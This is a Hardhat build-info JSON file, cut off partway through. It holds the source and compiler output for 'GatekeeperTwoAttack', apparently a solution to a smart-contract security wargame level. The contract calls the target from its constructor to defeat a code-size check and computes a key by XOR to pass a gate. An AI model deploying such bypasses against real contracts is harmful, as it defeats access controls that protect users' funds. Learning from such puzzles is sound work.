{
	"id": "5c73e3f88a155adbf93ef116a3f855f1",
	"_format": "hh-sol-build-info-1",
	"solcVersion": "0.6.12",
	"solcLongVersion": "0.6.12+commit.27d51765",
	"input": {
		"language": "Solidity",
		"sources": {
			"contracts/GateKeeperTwoAttack.sol": {
				"content": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.6.0;\r\n\r\ncontract GatekeeperTwoAttack {\r\n\r\n    //call from constructor to get code size 0 even from a contract\r\n    constructor (address _victimContractAddress) public\r\n    {\r\n        bytes8 gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1));\r\n        _victimContractAddress.call(abi.encodeWithSignature(\"enter(bytes8)\", gateKey));\r\n    }\r\n}"
			}
		},
		"settings": {
			"optimizer": {
				"enabled": false,
				"runs": 200
			},
			"outputSelection": {
				"*": {
					"": [
						"ast"
					],
					"*": [
						"abi",
						"metadata",
						"devdoc",
						"userdoc",
						"storageLayout",
						"evm.legacyAssembly",
						"evm.bytecode",
						"evm.deployedBytecode",
						"evm.methodIdentifiers",
						"evm.gasEstimates",
						"evm.assembly"
					]
				}
			}
		}
	},
	"output": {
		"contracts": {
			"contracts/GateKeeperTwoAttack.sol": {
				"GatekeeperTwoAttack": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "_victimContractAddress",
									"type": "address"
								}
							],
							"stateMutability": "nonpayable",
							"type": "constructor"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"contracts/GateKeeperTwoAttack.sol\":60:436  contract GatekeeperTwoAttack {\r... */\n  mstore(0x40, 0x80)\n    /* \"contracts/GateKeeperTwoAttack.sol\":167:433  constructor (address _victimContractAddress) public\r... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  0x20\n  dup2\n  lt\n  iszero\n  tag_2\n  jumpi\n  0x00\n  dup1\n  revert\ntag_2:\n  dup2\n  add\n  swap1\n  dup1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  swap3\n  swap2\n  swap1\n  pop\n  pop\n  pop\n    /* \"contracts/GateKeeperTwoAttack.sol\":235:249  bytes8 gateKey */\n  0x00\n    /* \"contracts/GateKeeperTwoAttack.sol\":333:334  1 */\n  0x01\n    /* \"contracts/GateKeeperTwoAttack.sol\":328:329  0 */\n  0x00\n    /* \"contracts/GateKeeperTwoAttack.sol\":321:334  uint64(0) - 1 */\n  sub\n    /* \"contracts/GateKeeperTwoAttack.sol\":308:312  this */\n  address\n    /* \"contracts/GateKeeperTwoAttack.sol\":283:314  abi.encodePacked(address(this)) */\n  add(0x20, mload(0x40))\n  dup1\n  dup3\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  0x60\n  shl\n  dup2\n  mstore\n  0x14\n  add\n  swap2\n  pop\n  pop\n  mload(0x40)\n  0x20\n  dup2\n  dup4\n  sub\n  sub\n  dup2\n  mstore\n  swap1\n  0x40\n  mstore\n    /* \"contracts/GateKeeperTwoAttack.sol\":273:315  keccak256(abi.encodePacked(address(this))) */\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  keccak256\n    /* \"contracts/GateKeeperTwoAttack.sol\":259:317  uint64(bytes8(keccak256(abi.encodePacked(address(this))))) */\n  0xc0\n  shr\n    /* \"contracts/GateKeeperTwoAttack.sol\":259:335  uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1) */\n  xor\n    /* \"contracts/GateKeeperTwoAttack.sol\":252:336  bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1)) */\n  0xc0\n  shl\n    /* \"contracts/GateKeeperTwoAttack.sol\":235:336  bytes8 gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1)) */\n  swap1\n  pop\n    /* \"contracts/GateKeeperTwoAttack.sol\":347:369  _victimContractAddress */\n  dup2\n    /* \"contracts/GateKeeperTwoAttack.sol\":347:374  _victimContractAddress.call */\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n    /* \"contracts/GateKeeperTwoAttack.sol\":416:423  gateKey */\n  dup2\n    /* \"contracts/GateKeeperTwoAttack.sol\":375:424  abi.encodeWithSignature(\"enter(bytes8)\", gateKey) */\n  add(0x24, mload(0x40))\n  dup1\n  dup3\n  not(0xffffffffffffffffffffffffffffffffffffffffffffffff)\n  and\n  dup2\n  mstore\n  0x20\n  add\n  swap2\n  pop\n  pop\n  mload(0x40)\n  0x20\n  dup2\n  dup4\n  sub\n  sub\n  dup2\n  mstore\n  swap1\n  0x40\n  mstore\n  and(not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff), 0x3370204e00000000000000000000000000000000000000000000000000000000)\n  0x20\n  dup3\n  add\n  dup1\n  mload\n  0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n  dup4\n  dup2\n  dup4\n  and\n  or\n  dup4\n  mstore\n  pop\n  pop\n  pop\n  pop\n    /* \"contracts/GateKeeperTwoAttack.sol\":347:425  _victimContractAddress.call(abi.encodeWithSignature(\"enter(bytes8)\", gateKey)) */\n  mload(0x40)\n  dup1\n  dup3\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  dup1\n  dup4\n  dup4\ntag_5:\n  0x20\n  dup4\n  lt\n  tag_7\n  jumpi\n  dup1\n  mload\n  dup3\n  mstore\n  0x20\n  dup3\n  add\n  swap2\n  pop\n  0x20\n  dup2\n  add\n  swap1\n  pop\n  0x20\n  dup4\n  sub\n  swap3\n  pop\n  jump(tag_5)\ntag_7:\n  0x01\n  dup4\n  0x20\n  sub\n  0x0100\n  exp\n  sub\n  dup1\n  not\n  dup3\n  mload\n  and\n  dup2\n  dup5\n  mload\n  and\n  dup1\n  dup3\n  or\n  dup6\n  mstore\n  pop\n  pop\n  pop\n  pop\n  pop\n  pop\n  swap1\n  pop\n  add\n  swap2\n  pop\n  pop\n  0x00\n  mload(0x40)\n  dup1\n  dup4\n  sub\n  dup2\n  0x00\n  dup7\n  gas\n  call\n  swap2\n  pop\n  pop\n  returndatasize\n  dup1\n  0x00\n  dup2\n  eq\n  tag_10\n  jumpi\n  mload(0x40)\n  swap2\n  pop\n  and(add(returndatasize, 0x3f), not(0x1f))\n  dup3\n  add\n  0x40\n  mstore\n  returndatasize\n  dup3\n  mstore\n  returndatasize\n  0x00\n  0x20\n  dup5\n  add\n  returndatacopy\n  jump(tag_9)\ntag_10:\n  0x60\n  swap2\n  pop\ntag_9:\n  pop\n  pop\n  pop\n    /* \"contracts/GateKeeperTwoAttack.sol\":167:433  constructor (address _victimContractAddress) public\r... */\n  pop\n  pop\n    /* \"contracts/GateKeeperTwoAttack.sol\":60:436  contract GatekeeperTwoAttack {\r... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/GateKeeperTwoAttack.sol\":60:436  contract GatekeeperTwoAttack {\r... */\n      mstore(0x40, 0x80)\n      0x00\n      dup1\n      revert\n\n    auxdata: 0xa2646970667358221220058b6767aa89b9c541f6407d10b6831cc5d970179f3e906fc67bcbf70d2aed4b64736f6c634300060c0033\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b506040516102403803806102408339818101604052602081101561003357600080fd5b81019080805190602001909291905050506000600160000330604051602001808273ffffffffffffffffffffffffffffffffffffffff1660601b81526014019150506040516020818303038152906040528051906020012060c01c1860c01b90508173ffffffffffffffffffffffffffffffffffffffff1681604051602401808277ffffffffffffffffffffffffffffffffffffffffffffffff191681526020019150506040516020818303038152906040527f3370204e000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040518082805190602001908083835b602083106101875780518252602082019150602081019050602083039250610164565b6001836020036101000a0380198251168184511680821785525050505050509050019150506000604051808303816000865af19150503d80600081146101e9576040519150601f19603f3d011682016040523d82523d6000602084013e6101ee565b606091505b5050505050603f806102016000396000f3fe6080604052600080fdfea2646970667358221220058b6767aa89b9c541f6407d10b6831cc5d970179f3e906fc67bcbf70d2aed4b64736f6c634300060c0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x240 CODESIZE SUB DUP1 PUSH2 0x240 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x33 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH1 0x0 PUSH1 0x1 PUSH1 0x0 SUB ADDRESS PUSH1 0x40 MLOAD PUSH1 0x20 ADD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x60 SHL DUP2 MSTORE PUSH1 0x14 ADD SWAP2 POP POP PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE DUP1 MLOAD SWAP1 PUSH1 0x20 ADD KECCAK256 PUSH1 0xC0 SHR XOR PUSH1 0xC0 SHL SWAP1 POP DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 PUSH1 0x40 MLOAD PUSH1 0x24 ADD DUP1 DUP3 PUSH24 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE PUSH32 0x3370204E00000000000000000000000000000000000000000000000000000000 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND PUSH1 0x20 DUP3 ADD DUP1 MLOAD PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP4 DUP2 DUP4 AND OR DUP4 MSTORE POP POP POP POP PUSH1 0x40 MLOAD DUP1 DUP3 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x187 JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH1 0x20 DUP4 SUB SWAP3 POP PUSH2 0x164 JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP7 GAS CALL SWAP2 POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x1E9 JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x1EE JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP POP POP POP PUSH1 0x3F DUP1 PUSH2 0x201 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 SDIV DUP12 PUSH8 0x67AA89B9C541F640 PUSH30 0x10B6831CC5D970179F3E906FC67BCBF70D2AED4B64736F6C634300060C00 CALLER ",
							"sourceMap": "60:376:0:-:0;;;167:266;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;235:14;333:1;328;321:13;308:4;283:31;;;;;;;;;;;;;;;;;;;;;;;;;;;;;273:42;;;;;;259:58;;:76;252:84;;235:101;;347:22;:27;;416:7;375:49;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;347:78;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;167:266;;60:376;;;;;;"
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "6080604052600080fdfea2646970667358221220058b6767aa89b9c541f6407d10b6831cc5d970179f3e906fc67bcbf70d2aed4b64736f6c634300060c0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 SDIV DUP12 PUSH8 0x67AA89B9C541F640 PUSH30 0x10B6831CC5D970179F3E906FC67BCBF70D2AED4B64736F6C634300060C00 CALLER ",
							"sourceMap": "60:376:0:-:0;;;;;"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "12600",
								"executionCost": "infinite",
								"totalCost": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 60,
									"end": 436,
									"name": "PUSH",
									"source": 0,
									"value": "80"
								},
								{
									"begin": 60,
									"end": 436,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 60,
									"end": 436,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 167,
									"end": 433,
									"name": "CALLVALUE",
									"source": 0
								},
								{
									"begin": 167,
									"end": 433,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 167,
									"end": 433,
									"name": "ISZERO",
									"source": 0
								},
								{
									"begin": 167,
									"end": 433,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 167,
									"end": 433,
									"name": "JUMPI",
									"source": 0
								},
								{
									"begin": 167,
									"end": 433,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 167,
									"end": 433,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 167,
									"end": 433,
									"name": "REVERT",
									"source": 0
								},
								{
									"begin": 167,
									"end": 433,
									"name": "tag",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 167,
									"end": 433,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 167,
									"end": 433,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 167,
									"end": 433,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 167,
									"end": 433,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 167,
									"end": 433,
									"name": "PUSHSIZE",
									"source": 0
								},
								{
									"begin": 167,
									"end": 433,
									"name": "CODESIZE",
									"source": 0
								},
								{
									"begin": 167,
									"end": 433,
									"name": "SUB",
									"source": 0
								},
								{
									"begin": 167,
									"end": 433,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 167,
									"end": 433,
									"name": "PUSHSIZE",
									"source": 0
								},
								{
									"begin": 167,
									"end": 433,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 167,
									"end": 433,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 167,
									"end": 433,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 167,
									"end": 433,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 167,
									"end": 433,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 167,
									"end": 433,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 167,
									"end": 433,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 167,
									"end": 433,
									"name": "PUSH",
									"source": 0,
									"value": "20"
								},
								{
									"begin": 167,
									"end": 433,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 167,
									"end": 433,
									"name": "LT",
									"source": 0
								},
								{
									"begin": 167,
									"end": 433,
									"name": "ISZERO",
									"source": 0
								},
								{
									"begin": 167,
									"end": 433,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "2"
								},
								{
									"begin": 167,
									"end": 433,
									"name": "JUMPI",
									"source": 0
								},
								{
									"begin": 167,
									"end": 433,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 167,
									"end": 433,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 167,
									"end": 433,
									"name": "REVERT",
									"source": 0
								},
								{
									"begin": 167,
									"end": 433,
									"name": "tag",
									"source": 0,
									"value": "2"
								},
								{
									"begin": 167,
									"end": 433,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 167,
									"end": 433,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 167,
									"end": 433,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 167,
									"end": 433,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 167,
									"end": 433,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 167,
									"end": 433,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 167,
									"end": 433,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 167,
									"end": 433,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 167,
									"end": 433,
									"name": "PUSH",
									"source": 0,
									"value": "20"
								},
								{
									"begin": 167,
									"end": 433,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 167,
									"end": 433,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 167,
									"end": 433,
									"name": "SWAP3",
									"source": 0
								},
								{
									"begin": 167,
									"end": 433,
									"name": "SWAP2",
									"source": 0
								},
								{
									"begin": 167,
									"end": 433,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 167,
									"end": 433,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 167,
									"end": 433,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 167,
									"end": 433,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 235,
									"end": 249,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 333,
									"end": 334,
									"name": "PUSH",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 328,
									"end": 329,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 321,
									"end": 334,
									"name": "SUB",
									"source": 0
								},
								{
									"begin": 308,
									"end": 312,
									"name": "ADDRESS",
									"source": 0
								},
								{
									"begin": 283,
									"end": 314,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 283,
									"end": 314,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 283,
									"end": 314,
									"name": "PUSH",
									"source": 0,
									"value": "20"
								},
								{
									"begin": 283,
									"end": 314,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 283,
									"end": 314,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 283,
									"end": 314,
									"name": "DUP3",
									"source": 0
								},
								{
									"begin": 283,
									"end": 314,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 283,
									"end": 314,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 283,
									"end": 314,
									"name": "PUSH",
									"source": 0,
									"value": "60"
								},
								{
									"begin": 283,
									"end": 314,
									"name": "SHL",
									"source": 0
								},
								{
									"begin": 283,
									"end": 314,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 283,
									"end": 314,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 283,
									"end": 314,
									"name": "PUSH",
									"source": 0,
									"value": "14"
								},
								{
									"begin": 283,
									"end": 314,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 283,
									"end": 314,
									"name": "SWAP2",
									"source": 0
								},
								{
									"begin": 283,
									"end": 314,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 283,
									"end": 314,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 283,
									"end": 314,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 283,
									"end": 314,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 283,
									"end": 314,
									"name": "PUSH",
									"source": 0,
									"value": "20"
								},
								{
									"begin": 283,
									"end": 314,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 283,
									"end": 314,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 283,
									"end": 314,
									"name": "SUB",
									"source": 0
								},
								{
									"begin": 283,
									"end": 314,
									"name": "SUB",
									"source": 0
								},
								{
									"begin": 283,
									"end": 314,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 283,
									"end": 314,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 283,
									"end": 314,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 283,
									"end": 314,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 283,
									"end": 314,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 273,
									"end": 315,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 273,
									"end": 315,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 273,
									"end": 315,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 273,
									"end": 315,
									"name": "PUSH",
									"source": 0,
									"value": "20"
								},
								{
									"begin": 273,
									"end": 315,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 273,
									"end": 315,
									"name": "KECCAK256",
									"source": 0
								},
								{
									"begin": 259,
									"end": 317,
									"name": "PUSH",
									"source": 0,
									"value": "C0"
								},
								{
									"begin": 259,
									"end": 317,
									"name": "SHR",
									"source": 0
								},
								{
									"begin": 259,
									"end": 335,
									"name": "XOR",
									"source": 0
								},
								{
									"begin": 252,
									"end": 336,
									"name": "PUSH",
									"source": 0,
									"value": "C0"
								},
								{
									"begin": 252,
									"end": 336,
									"name": "SHL",
									"source": 0
								},
								{
									"begin": 235,
									"end": 336,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 235,
									"end": 336,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 347,
									"end": 369,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 347,
									"end": 374,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 347,
									"end": 374,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 416,
									"end": 423,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 375,
									"end": 424,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 375,
									"end": 424,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 375,
									"end": 424,
									"name": "PUSH",
									"source": 0,
									"value": "24"
								},
								{
									"begin": 375,
									"end": 424,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 375,
									"end": 424,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 375,
									"end": 424,
									"name": "DUP3",
									"source": 0
								},
								{
									"begin": 375,
									"end": 424,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 375,
									"end": 424,
									"name": "NOT",
									"source": 0
								},
								{
									"begin": 375,
									"end": 424,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 375,
									"end": 424,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 375,
									"end": 424,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 375,
									"end": 424,
									"name": "PUSH",
									"source": 0,
									"value": "20"
								},
								{
									"begin": 375,
									"end": 424,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 375,
									"end": 424,
									"name": "SWAP2",
									"source": 0
								},
								{
									"begin": 375,
									"end": 424,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 375,
									"end": 424,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 375,
									"end": 424,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 375,
									"end": 424,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 375,
									"end": 424,
									"name": "PUSH",
									"source": 0,
									"value": "20"
								},
								{
									"begin": 375,
									"end": 424,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 375,
									"end": 424,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 375,
									"end": 424,
									"name": "SUB",
									"source": 0
								},
								{
									"begin": 375,
									"end": 424,
									"name": "SUB",
									"source": 0
								},
								{
									"begin": 375,
									"end": 424,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 375,
									"end": 424,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 375,
									"end": 424,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 375,
									"end": 424,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 375,
									"end": 424,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 375,
									"end": 424,
									"name": "PUSH",
									"source": 0,
									"value": "3370204E00000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 375,
									"end": 424,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 375,
									"end": 424,
									"name": "NOT",
									"source": 0
								},
								{
									"begin": 375,
									"end": 424,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 375,
									"end": 424,
									"name": "PUSH",
									"source": 0,
									"value": "20"
								},
								{
									"begin": 375,
									"end": 424,
									"name": "DUP3",
									"source": 0
								},
								{
									"begin": 375,
									"end": 424,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 375,
									"end": 424,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 375,
									"end": 424,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 375,
									"end": 424,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 375,
									"end": 424,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 375,
									"end": 424,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 375,
									"end": 424,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 375,
									"end": 424,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 375,
									"end": 424,
									"name": "OR",
									"source": 0
								},
								{
									"begin": 375,
									"end": 424,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 375,
									"end": 424,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 375,
									"end": 424,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 375,
									"end": 424,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 375,
									"end": 424,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 375,
									"end": 424,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 347,
									"end": 425,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "DUP3",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "PUSH",
									"source": 0,
									"value": "20"
								},
								{
									"begin": 347,
									"end": 425,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "tag",
									"source": 0,
									"value": "5"
								},
								{
									"begin": 347,
									"end": 425,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "PUSH",
									"source": 0,
									"value": "20"
								},
								{
									"begin": 347,
									"end": 425,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "LT",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "7"
								},
								{
									"begin": 347,
									"end": 425,
									"name": "JUMPI",
									"source": 0
								},
								{
									"begin": 347,
									"end": 425,
									"name": "DUP1",
									"source": 0
								},
								{
